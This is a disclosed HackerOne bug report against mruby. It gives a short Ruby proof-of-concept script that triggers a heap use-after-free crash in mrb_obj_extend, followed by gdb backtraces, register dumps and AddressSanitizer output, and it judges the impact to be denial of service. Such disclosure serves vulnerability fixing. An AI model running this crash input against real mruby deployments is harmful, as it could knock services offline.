# SIGSEGV - mrb_obj_extend - line:413

## Report Details
- **Report ID**: 197694
- **URL**: https://hackerone.com/reports/197694
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-01-12T01:07:55.248Z
- **Disclosed**: 2017-03-09T01:26:59.033Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC:
-------------------

The following code triggers the bug (attached as test_mrb_obj_extend_413.rb):

	module Test end
	def method_missing(s)extend(Test)end
	def set(v)a.set(0)end
	set(0)

Mirb - Debug:
-------------------

	(gdb) r test_mrb_obj_extend_413.rb 
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/x/Desktop/research/test_2/mruby/bin/mirb test_mrb_obj_extend_413.rb
	mirb - Embeddable Interactive Ruby Shell

	 => nil
	 => :method_missing
	 => :set

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413
	413	    mrb_funcall(mrb, argv[argc], "extended", 1, obj);
	(gdb) info reg
	rax            0x7529f0	7678448
	rbx            0x0	0
	rcx            0x3	3
	rdx            0x0	0
	rsi            0x6ad1b0	7000496
	rdi            0x6ad010	7000080
	rbp            0x7fffffffc470	0x7fffffffc470
	rsp            0x7fffffffc420	0x7fffffffc420
	r8             0x1	1
	r9             0x6b01b0	7012784
	r10            0x7fff0000000a	140733193388042
	r11            0x7ffff7895770	140737346361200
	r12            0x401ca0	4201632
	r13            0x7fffffffe040	140737488347200
	r14            0x0	0
	r15            0x0	0
	rip            0x418e9b	0x418e9b <mrb_obj_extend+241>
	eflags         0x10206	[ PF IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	408	  for (i = 0; i < argc; i++) {
	409	    mrb_check_type(mrb, argv[i], MRB_TT_MODULE);
	410	  }
	411	  while (argc--) {
	412	    mrb_funcall(mrb, argv[argc], "extend_object", 1, obj);
	413	    mrb_funcall(mrb, argv[argc], "extended", 1, obj);
	414	  }
	415	  return obj;
	416	}
	417	

	
Backtrace:
-------------------

	(gdb) bt
	#0  0x0000000000418e9b in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x7529f0, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413
	#1  0x0000000000418f43 in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450
	#2  0x0000000000426f65 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b00f0, pc=0x71d50c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174
	#3  0x000000000042541b in mrb_vm_run (mrb=0x6ad010, proc=0x6b0000, self=..., stack_keep=1) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772
	#4  0x0000000000402b90 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
-------------------

	x@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mirb test_mrb_obj_extend_413.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => nil
	 => :method_missing
	 => :set
	=================================================================
	==2583==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x000000595ddc bp 0x7fffbc91f530 sp 0x7fffbc91f528
	READ of size 8 at 0x61d00001e850 thread T0
		#0 0x595ddb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5
		#1 0x58d36f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10
		#2 0x5df4e8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18
		#3 0x5d2fbb in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
		#4 0x4f3ee8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#5 0x7ff991aaeec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#6 0x41a585 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a585)
	
Mruby - Debug:
-------------------
	
	(gdb) r test_mrb_obj_extend_413.rb 
	The program being debugged has been started already.
	Start it from the beginning? (y or n) y
	Starting program: /home/x/Desktop/research/test_2/mruby/bin/mruby test_mrb_obj_extend_413.rb

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413
	413	    mrb_funcall(mrb, argv[argc], "extended", 1, obj);
	(gdb) info reg
	rax            0x759b10	7707408
	rbx            0x6bfe40	7077440
	rcx            0x4	4
	rdx            0x0	0
	rsi            0x6ad1b0	7000496
	rdi            0x6ad010	7000080
	rbp            0x7fffffffd5a0	0x7fffffffd5a0
	rsp            0x7fffffffd550	0x7fffffffd550
	r8             0x1	1
	r9             0x0	0
	r10            0x0	0
	r11            0x7ffff7895770	140737346361200
	r12            0x401b20	4201248
	r13            0x7fffffffe040	140737488347200
	r14            0x0	0
	r15            0x0	0
	rip            0x418765	0x418765 <mrb_obj_extend+241>
	eflags         0x10202	[ IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	408	  for (i = 0; i < argc; i++) {
	409	    mrb_check_type(mrb, argv[i], MRB_TT_MODULE);
	410	  }
	411	  while (argc--) {
	412	    mrb_funcall(mrb, argv[argc], "extend_object", 1, obj);
	413	    mrb_funcall(mrb, argv[argc], "extended", 1, obj);
	414	  }
	415	  return obj;
	416	}
	417

Backtrace:
-------------------

	(gdb) bt
	#0  0x0000000000418765 in mrb_obj_extend (mrb=0x6ad010, argc=0, argv=0x759b10, obj=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:413
	#1  0x000000000041880d in mrb_obj_extend_m (mrb=0x6ad010, self=...) at /home/x/Desktop/research/test_2/mruby/src/kernel.c:450
	#2  0x0000000000424df2 in mrb_vm_exec (mrb=0x6ad010, proc=0x6b0120, pc=0x71b41c) at /home/x/Desktop/research/test_2/mruby/src/vm.c:1174
	#3  0x00000000004232a8 in mrb_vm_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:772
	#4  0x000000000042b2bc in mrb_top_run (mrb=0x6ad010, proc=0x6b01b0, self=..., stack_keep=0) at /home/x/Desktop/research/test_2/mruby/src/vm.c:2490
	#5  0x0000000000445cca in mrb_load_exec (mrb=0x6ad010, p=0x709480, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5755
	#6  0x0000000000445d60 in mrb_load_file_cxt (mrb=0x6ad010, f=0x709080, c=0x7080b0) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-compiler/core/parse.y:5764
	#7  0x00000000004024f8 in main (argc=2, argv=0x7fffffffe048) at /home/x/Desktop/research/test_2/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232

Clang - mruby
-------------------

	x@x:~/Desktop/research/test_2/mruby-engine/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../../clang/mruby/bin/mruby test_mrb_obj_extend_413.rb 
	=================================================================
	==2585==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d00001e850 at pc 0x0000005947ec bp 0x7fff9d072750 sp 0x7fff9d072748
	READ of size 8 at 0x61d00001e850 thread T0
		#0 0x5947eb in mrb_obj_extend /home/x/Desktop/research/clang/mruby/src/kernel.c:413:5
		#1 0x58bd7f in mrb_obj_extend_m /home/x/Desktop/research/clang/mruby/src/kernel.c:450:10
		#2 0x5d8fb8 in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1174:18
		#3 0x5cca8b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10
		#4 0x5ffa48 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2490:12
		#5 0x66fe49 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7
		#6 0x670965 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10
		#7 0x4f3ad5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11
		#8 0x7f84000caec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#9 0x41a4e5 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a4e5)

Impact
-------------------

As far as I can see, it is not exploitable. But it can cause DoS.

## Attachments
- test_mrb_obj_extend_413.rb
